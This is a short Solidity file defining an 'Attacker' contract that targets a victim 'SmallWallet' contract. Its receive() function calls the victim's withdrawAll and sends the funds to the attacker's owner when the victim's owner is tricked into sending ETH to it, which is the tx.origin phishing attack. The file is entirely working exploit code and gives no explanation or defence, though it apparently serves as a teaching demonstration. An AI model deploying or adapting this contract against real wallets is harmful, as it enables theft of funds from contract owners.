// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

// interface to be able to interact with the Victim's Contract
interface ISmallWallet {
  function withdrawAll(address _recipient) external; 
}

contract Attacker is Ownable {
  ISmallWallet private immutable smallWallet;

  constructor(ISmallWallet _smallWallet) {
    smallWallet = _smallWallet;
  }

  receive() external payable {
    // If the victim's contract owner is tricked to send ETH to this contract, it is game over!
    smallWallet.withdrawAll(owner());
  }
}
